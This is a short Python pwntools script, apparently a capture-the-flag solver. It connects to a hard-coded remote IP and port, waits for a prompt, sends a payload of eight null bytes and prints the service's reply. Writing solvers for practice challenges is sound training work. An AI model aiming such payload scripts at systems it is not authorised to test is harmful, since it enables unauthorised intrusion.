from pwn import remote

HOST = '94.237.61.88'
PORT =  34040

io = remote(HOST, PORT)

print(io.recvuntil(b':').decode())

payload = b'\x00' * 8
io.send(payload)

response = io.recvall().decode()
print(response)

io.close()
